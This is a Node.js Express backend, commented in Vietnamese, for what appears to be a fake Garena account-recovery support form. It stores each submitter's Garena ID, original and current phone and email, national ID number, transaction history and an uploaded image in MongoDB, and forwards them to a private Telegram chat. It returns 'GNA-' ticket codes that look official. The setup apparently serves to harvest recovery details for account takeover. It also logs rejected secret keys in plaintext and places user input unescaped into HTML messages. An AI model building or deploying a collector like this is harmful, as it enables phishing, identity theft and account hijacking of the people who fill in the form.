/**
 * Backend Server V12.0 - Tích hợp MongoDB
 * @author Dev TanPhat
 * V12.0 - Báo lỗi Telegram "Loud Errors"
 */

// --- Import Dependencies ---
const express = require('express');
const path = require('path');
const multer = require('multer');
const fs = require('fs');
const axios = require('axios');
const FormData = require('form-data');
const mongoose = require('mongoose');
const short = require('short-uuid');
const Ticket = require('./models/Ticket');
require('dotenv').config();

// --- Application Constants ---
const app = express();
const PORT = 3000;
const UPLOAD_DIR = '/tmp/uploads_tanphat';

// --- Security & Bot Configuration ---
const REAL_SECRET_KEY = process.env.REAL_SECRET_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const MONGODB_URI = process.env.MONGODB_URI;

// --- [MỚI] Kết nối Database ---
if (MONGODB_URI) {
    mongoose.connect(MONGODB_URI)
        .then(() => console.log("[MONGODB] Kết nối Database thành công!"))
        .catch(err => console.error("[MONGODB ERROR] Không thể kết nối:", err));
} else {
    console.error("[MONGODB ERROR] Không tìm thấy MONGODB_URI. Vui lòng kiểm tra file .env hoặc Vercel Variables");
}

// --- Storage Engine (Multer) ---
if (!fs.existsSync(UPLOAD_DIR)){
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_DIR + '/'),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

// --- Middleware Configuration ---
app.use(express.json()); 
app.use(express.urlencoded({ extended: true }));

// --- API Endpoints ---

// Xử lý thủ công CÁC FILE TĨNH (HTML, CSS, JS)
app.get('/', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'index.html'));
});
app.get('/style.css', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'style.css'));
});
app.get('/script.js', (req, res) => {
    res.sendFile(path.join(process.cwd(), 'script.js'));
});


/**
 * [POST] /verify-key
 */
app.post('/verify-key', (req, res) => {
    const { key } = req.body;
    if (!key) {
        return res.status(400).json({ success: false, message: "Không nhận được key." });
    }
    if (key === REAL_SECRET_KEY) {
        console.log(`[AUTH] Xác thực thành công!`);
        res.json({ success: true, message: "Xác thực thành công!" });
    } else {
        console.log(`[AUTH] Key không hợp lệ: ${key}`);
        res.status(401).json({ success: false, message: "Key không hợp lệ." });
    }
});

/**
 * [POST] /submit-form (Nâng cấp lớn)
 */
app.post('/submit-form', (req, res) => {
    upload.single('attachment')(req, res, async function (err) { // Thêm async
        if (err) {
            console.error("Lỗi Multer:", err);
            return res.status(500).json({ success: false, message: "Lỗi upload file." });
        }
        
        const textData = req.body; 
        const fileData = req.file;

        try {
            // 1. Tạo Mã Tra Cứu (MỚI)
            const translator = short();
            const ticketId = `GNA-${translator.new().slice(0, 6).toUpperCase()}`;

            // 2. Tạo Phiếu Yêu Cầu (MỚI)
            const newTicket = new Ticket({
                ticketId: ticketId,
                status: 'Đang chờ xử lý',
                garenaId: textData['garena-id'],
                dateLost: textData['date-lost'],
                firstPhone: textData['first-phone'],
                firstEmail: textData['first-email'],
                currentPhone: textData['current-phone'],
                currentEmail: textData['current-email'],
                accountCccd: textData['account-cccd'],
                accountName: textData['account-name'],
                transactions: textData['transactions'],
                description: textData['description'],
                contactName: textData['contact-name'],
                contactCccd: textData['contact-cccd'],
                contactEmail: textData['contact-email'],
                contactPhone: textData['contact-phone'],
                fileName: fileData ? fileData.filename : null
            });

            // 3. Lưu vào Database (MỚI)
            await newTicket.save();
            console.log(`[DB] Đã lưu phiếu mới: ${ticketId}`);

            // 4. [SỬA LỖI V12.0] Gửi thông báo Telegram (CHỜ)
            // Phải "await" (chờ) cho đến khi nó gửi xong
            await sendTelegramNotification(newTicket, fileData);
            
            // 5. Trả Mã Tra Cứu về cho người dùng (MỚI)
            res.json({ 
                success: true, 
                message: "Đã nhận được yêu cầu của bạn!",
                ticketId: ticketId // <-- Gửi mã về
            });

        } catch (error) {
            console.error("[ERROR]", error.message);
            // Báo lỗi cho người dùng
            res.status(500).json({ 
                success: false, 
                message: `Lỗi: ${error.message}. Vui lòng kiểm tra lại Key/Token.` 
            });
        }
    });
});

/**
 * [GET] /lookup-ticket/:id (API MỚI)
 */
app.get('/lookup-ticket/:id', async (req, res) => {
    try {
        const ticketId = req.params.id.toUpperCase(); // Chuẩn hóa mã
        const ticket = await Ticket.findOne({ ticketId: ticketId });

        if (!ticket) {
            return res.status(404).json({ success: false, message: "Không tìm thấy mã phiếu." });
        }
        
        res.json({
            success: true,
            ticket: {
                ticketId: ticket.ticketId,
                status: ticket.status,
                createdAt: ticket.createdAt,
                description: ticket.description
            }
        });

    } catch (error) {
        console.error("[LOOKUP ERROR]", error.message);
        res.status(500).json({ success: false, message: "Lỗi máy chủ khi tra cứu." });
    }
});


// --- Telegram Service (Nâng cấp) ---
async function sendTelegramNotification(ticket, fileData) {
    
    let message = `<b>🔥 Yêu cầu Hỗ trợ Mới - ${ticket.ticketId} 🔥</b>\n\n`;
    message += `<b>Tên đăng nhập Garena:</b> <pre>${ticket.garenaId || 'Không điền'}</pre>\n`;
    message += `<b>Ngày mất TK:</b> ${ticket.dateLost || 'Không điền'}\n\n`;
    message += `<b>--- Thông tin liên hệ (Khách) ---</b>\n`;
    message += `<b>Họ tên:</b> ${ticket.contactName || 'Không điền'}\n`;
    message += `<b>Email:</b> <pre>${ticket.contactEmail || 'Không điền'}</pre>\n`;
    message += `<b>SĐT:</b> <pre>${ticket.contactPhone || 'Không điền'}</pre>\n\n`;
    message += `<b>--- Chi tiết vấn đề ---</b>\n`;
    message += `<pre>${ticket.description || 'Không điền'}</pre>\n\n`;
    
    const telegramApi = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

    try {
        if (fileData) {
            const url = `${telegramApi}/sendPhoto`;
            const form = new FormData();
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('caption', message);
            form.append('parse_mode', 'HTML');
            form.append('photo', fs.createReadStream(fileData.path));
            
            await axios.post(url, form, { headers: form.getHeaders() });
            console.log(`[TELEGRAM] Gửi ảnh cho phiếu ${ticket.ticketId} thành công!`);

            fs.unlink(fileData.path, (err) => {
                if(err) console.error("Không xóa được file tạm:", fileData.path);
            });

        } else {
            const url = `${telegramApi}/sendMessage`;
            await axios.post(url, {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            });
            console.log(`[TELEGRAM] Gửi tin nhắn cho phiếu ${ticket.ticketId} thành công!`);
        }
    } catch (error) {
        // [SỬA LỖI V12.0] Ném lỗi ra để /submit-form bắt được
        let errorMsg = error.message;
        if (error.response && error.response.data) {
            errorMsg = error.response.data.description;
        }
        console.error(`[TELEGRAM ERROR] Không gửi được tin nhắn cho ${ticket.ticketId}: ${errorMsg}`);
        throw new Error(errorMsg); // Ném lỗi ra ngoài
    }
}

// --- Server Initialization ---
// XUẤT app cho Vercel chạy
module.exports = app;